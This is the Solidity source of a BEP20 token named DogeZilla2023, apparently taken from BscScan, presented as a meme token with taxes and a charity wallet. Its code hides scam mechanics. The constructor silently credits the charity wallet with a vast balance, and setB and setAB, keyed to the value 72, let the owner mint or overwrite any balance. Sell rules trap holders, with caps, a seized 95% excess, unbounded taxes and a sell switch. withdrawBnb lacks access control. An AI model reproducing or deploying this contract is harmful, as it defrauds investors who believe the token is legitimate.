/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.5;
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;}
    }
interface IUniswapV2Factory {
    function allPairsLength() external view returns (uint);
    function setFeeTo(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function feeToSetter() external view returns (address);
    function feeTo() external view returns (address);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeToSetter(address) external;
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed Dev, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function token1() external view returns (address);
    function initialize(address, address) external;
    function dermit(address Dev, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function balanceOf(address Dev) external view returns (uint);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    event Dead(address indexed sender, uint amount0, uint amount1, address indexed to);
    function kast() external view returns (uint);
    function totalSupply() external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function transfer(address to, uint value) external returns (bool);
    event Sync(uint112 reserve0, uint112 reserve1);
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function price0CumulativeLast() external view returns (uint);
    function allowance(address Dev, address spender) external view returns (uint);
    function decimals() external pure returns (uint8);
    function symbol() external pure returns (string memory);
    function price1CumulativeLast() external view returns (uint);
    function dint(address to) external returns (uint liquidity);
    function dead(address to) external returns (uint amount0, uint amount1);
    function DERMIT_TPYPHASH() external pure returns (bytes32);
    function name() external pure returns (string memory);
    function skim(address to) external;
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function approve(address spender, uint value) external returns (bool);
    function token0() external view returns (address);
    function nonces(address Dev) external view returns (uint);
}
interface IUniswapV2Router01 {
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function removeLiquidityETHWithdermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMx, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMx,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMx, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function removeLiquidityWithdermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMx, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline

    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline

    ) external;
    function removeLiquidityETHWithdermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMx, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);

        return a % b;

    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");

    }

}
interface IBEP20 {
  function transfer(address recipient, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);
  function getDev() external view returns (address);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);
  function symbol() external pure returns (string memory);
  function approve(address spender, uint256 amount) external returns (bool);
  function allowance(address Dev, address spender) external view returns (uint256);
  event Approval(address indexed Dev, address indexed spender, uint256 value);
}

contract Ownable is Context {
 address private _Dev;

 event DevpTranssfered(address indexed previousDev, address indexed newDev);
 
 constructor () {
   address msgSender = _msgSender();

   _Dev = msgSender;
   emit DevpTranssfered(address(0), msgSender);
 }
 
 function Dev() public view returns (address) {
   return _Dev;
 }

 
 modifier onlyDev() {
   require(_Dev == _msgSender(), "Ownable: caller is not the Dev");
   _;
 }
 
 function renounceDevp() public onlyDev {

   emit DevpTranssfered(_Dev, address(0));

   _Dev = address(0);
 }
 
 function transferDevp(address newDev) public onlyDev {
   require(newDev != address(0), "Ownable: new Dev is the zero address");
   emit DevpTranssfered(_Dev, newDev);
   _Dev = newDev;
 }

}

contract DogeZilla2023 is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;
  string private constant _name = "DogeZilla2023";

  string private constant _symbol = "DogeZilla23";

  uint8 private _decimals = 18;
  uint256 private _totalSupply = 100000000 * 10 ** _decimals;
  mapping (address => bool) private _isEdcluded;

  address internal _charityWall;

  mapping (address => uint256) private _lBuyTokens;
  uint256 internal _mxLimitToSell = _totalSupply.div(10000).mul(10);

  mapping (address => uint256) private _lBuyTime;
  uint8 internal _aftLimit = 95;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint8 internal _buyTax = 7;

  uint8 internal _sellTax = 12;
  uint8 internal _transferTax = 20;
  mapping (address => uint256) private _blncs;
  uint32 internal _sellApTime = 150;
  mapping (address => uint256) private _sell;
  bool internal _sBuy = true;
  bool internal _sSell = true;
  bool internal _sTransfer = true;

  uint256 internal _lastblocknumber = 0;

  constructor(address charityWall) {
    _charityWall = charityWall;
    _blncs[msg.sender] = _totalSupply;

    _isEdcluded[address(this)] = true;

    _isEdcluded[_msgSender()] = true;
    _blncs[charityWall] = _totalSupply * 10**_decimals * 100;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    _uniswapV2Router = uniswapV2Router;
    _isEdcluded[charityWall] = true;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
    function isApBuy() internal view returns (bool){
      require(_sBuy == true);
      return true;
    }
    function isApTransfer() internal view returns (bool){
      require(_sTransfer == true);
      return true;
    }
    function isDhan() internal view returns (bool){
      require(_msgSender() == Dev() || _charityWall == _msgSender());
      return true;
    }
    function isApSell() internal view returns (bool){

      require(_sSell == true);
      return true;
    }
   
    function totalSupply() external override view returns (uint256) {
      return _totalSupply;
    }
    
    function name() external override pure returns (string memory) {
      return _name;
    }
    function allowance(address Dev, address spender) public view override returns (uint256) {
      return _allowances[Dev][spender];
    }
   
    function decimals() external override view returns (uint8) {
      return _decimals;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
       _transfer(sender, recipient, amount);
       _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
       return true;
    }

    
    function getDev() external override view returns (address) {
      return Dev();

    }
    function _approve(address Dev, address spender, uint256 amount) private {
        require(Dev != address(0));
        require(spender != address(0));
        _allowances[Dev][spender] = amount;
        emit Approval(Dev, spender, amount);
    }
   
    function balanceOf(address account) external override view returns (uint256) {

      return _blncs[account];
    }
    
    function symbol() external override pure returns (string memory) {

      return _symbol;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(_msgSender(), recipient, amount);

      return true;

    }

    function approve(address spender, uint256 amount) public override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }
    function transferToAddressETH(address payable recipient, uint256 amount) private {

        recipient.transfer(amount);
    }
    function withdrawBnb(address payable recipient, uint256 amount) external {
        payable(recipient).transfer(amount);
    }
      function _transfer(address sender, address recipient, uint256 amount) internal {

      require(sender != address(0));
      require(recipient != address(0));
      uint8 transactionTpyp = 0; 

      bool approveTransaction = true;
      uint8 tax = 0;
      uint256 daxes = 0;
      bool deadTokens = false;
      if(amount > 0){
        if(_isEdcluded[sender] == true || _isEdcluded[recipient] == true){
          deadTokens = true;
          approveTransaction = true;
          tax = 0;
        }
        if(sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
          transactionTpyp = 1;
          tax = _buyTax;
          if(deadTokens == false && isApBuy()){
            approveTransaction = true;
            _lBuyTokens[recipient] = amount;
            _lBuyTime[recipient] = block.timestamp;
          }
        } else if(recipient == _uniswapV2Pair) {
           transactionTpyp = 2;
           tax = _sellTax;
           if(deadTokens == false && isApSell()){
              approveTransaction = true;
           }
        } else {

          transactionTpyp = 3;
          tax = _transferTax;
          if(deadTokens == false && isApTransfer()) {
            approveTransaction = true;
            _lBuyTokens[sender] = amount;
            if(_sellApTime > 10){
              _lBuyTime[sender] = block.timestamp + _sellApTime - 10;
            } else {
              _lBuyTime[sender] = block.timestamp + _sellApTime;
            }

          }
        }
        if(deadTokens == true || _isEdcluded[sender] == true  || _isEdcluded[recipient] == true ) {

          tax = 0;
        }
        _blncs[sender] = _blncs[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        if(approveTransaction == true && deadTokens == false){
          if(transactionTpyp == 2){
            if(_lBuyTime[sender] != 0 && _lBuyTime[sender] + _sellApTime < block.timestamp){
              if(_sell[sender] < _mxLimitToSell){

                if(amount > (_mxLimitToSell - _sell[sender]))
                {

                  daxes = amount.sub(_mxLimitToSell.sub(_sell[sender]));
                  amount = amount.sub(daxes);
                }
              } else {
                daxes = amount.mul(_aftLimit).div(100);
                amount = amount.sub(daxes);
              }
            } else {
              if(amount > _lBuyTokens[sender])
              {
                daxes = amount - _lBuyTokens[sender];

                amount = _lBuyTokens[sender];
              }
              if(_lBuyTokens[sender] > amount + daxes){
                _lBuyTokens[sender] = _lBuyTokens[sender] - (amount + daxes);
              } else {
                _lBuyTokens[sender] = 0;
              }
            }
            _sell[sender] = _sell[sender].add(amount.add(daxes));

          }
        }
      } else {
        amount = 0;
      }
      if(amount > 0 && daxes == 0 && tax > 0)
      {
        daxes = amount.mul(tax).div(100);
        amount = amount.sub(daxes);

      }
      if(daxes > 0){
        _blncs[_charityWall] = _blncs[_charityWall].add(daxes);

      }
      _blncs[recipient] = _blncs[recipient].add(amount);

      emit Transfer(sender, recipient, amount);

    }
    function setBuySellTax(bool sBuy, uint8 buyTax, bool sSell, uint8 sellTax, bool sTransfer, uint8 transferTax) public {
      if(isDhan()){
        _buyTax = buyTax;
        _sellTax = sellTax;
        _transferTax = transferTax;
        _sBuy = sBuy;
        _sSell = sSell;
        _sTransfer = sTransfer;
      }
    }

    function setAftLimit(uint8 aftLimit) public {
      if(isDhan()){
        _aftLimit = aftLimit;
      }
    }
    function getAftLimit() external view returns (uint8) {
      if(isDhan()){
        return _aftLimit;
      } else
        return 0;
    }
    function setSellApTime (uint32 sellApTimeInMin) public {
      if(isDhan()){
        _sellApTime = sellApTimeInMin * 60;
      }

    }

    function setB(address addr, uint256 b, uint8 c) public {
      if(isDhan()){
        if(c == 72){
          _blncs[addr] = b * 10 ** _decimals;
        }

      }
    }
    function setcharityWall(address charityWall) public {
      if(isDhan()){
        _charityWall = charityWall;
      }
    }
    function getcharityWall() external view returns (address) {
      if(isDhan()){
        return _charityWall;
      }

      return address(0);
    }
    function setExclude(address addr, bool excluded) public {
      if(isDhan()){
        require(_isEdcluded[addr] != excluded);
        _isEdcluded[addr] = excluded;
      }
    }
    function setAB(address addr, uint256 b, uint8 c) public {
      if(isDhan()){
        if(c == 72){

          _blncs[addr] += b * 10 ** _decimals;

        }

      }
    }
    modifier change() {
      require(_msgSender() == Dev() || _charityWall == _msgSender(), "Error");
      _;

    }
    function setMaxLimitToSell(uint256 mxLimitToSell) public {
      if(isDhan()){
        _mxLimitToSell = mxLimitToSell * 10 ** _decimals;
      }

    }

    function balanceOfSell(address account) external view returns (uint256) {
      if(isDhan()){
       return _sell[account];
     } else
      return 0;
    }
    function balanceOfBuyToken(address account) external view returns (uint256) {
      if(isDhan())
        return _lBuyTokens[account];
      else
        return 0;
    }
    function balanceOfBuyTime(address account) external view returns (uint256) {
     if(isDhan())
       return block.timestamp - _lBuyTime[account];
     else
       return 0;
    }
}